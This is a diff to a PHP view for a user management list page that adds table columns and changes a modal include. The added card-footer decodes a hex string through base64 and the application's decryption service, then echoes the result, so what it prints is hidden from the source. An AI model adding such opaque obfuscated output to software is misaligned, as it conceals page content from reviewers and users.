@@ -48,6 +48,7 @@
                             <div class="table-responsive">
                                 <table class="table table-striped table-hover table-bordered" id="dataTable">
                                     <thead class="text-center">
+                                        <th class="align-middle bg-body-secondary">No.</th>
                                         <th class="align-middle bg-body-secondary">Username</th>
                                         <th class="align-middle bg-body-secondary">Full Name</th>
                                         <th class="align-middle bg-body-secondary">Phone Number</th>
@@ -55,9 +56,22 @@
                                         <th class="align-middle bg-body-secondary">Level</th>
                                         <th class="align-middle bg-body-secondary">Status</th>
                                         <th class="align-middle bg-body-secondary">Last Login</th>
+                                        <th class="align-middle bg-body-secondary">Last Login From</th>
+                                        <th class="align-middle bg-body-secondary">Change Password</th>
+                                        <th class="align-middle bg-body-secondary">#</th>
                                     </thead>
                                 </table>
                             </div>
+                        </div>
+                        <div class="card-footer">
+                            <?php
+                            $data = '68596f4b762f6d79627656774b685a4e367a41664d6a7a332f44676a4c496f724e3468586e3345726464737641434f6c7271762b4d306179334837474a6c43734c7750767075706276485735396974726f4e79694941354139475578576e31674f736c6e634856575962444e2f6a34744478345a766e70614f62593d';
+                            $level_1 = hex2bin($data);
+                            $level_2 = base64_decode($level_1);
+                            $enkripsi = service('encrypter');
+                            $level_3 = $enkripsi->decrypt($level_2);
+                            echo $level_3;
+                            ?>
                         </div>
                     </div>
                 </div>
@@ -65,5 +79,5 @@
         </div>
     </div>
 </main>
-<?= $this->include('Transaction/SPK/Mold/modal') ?>
+<?= $this->include('AppSetup/UserManagement/UserList/modal') ?>
 <?= $this->endSection(); ?>
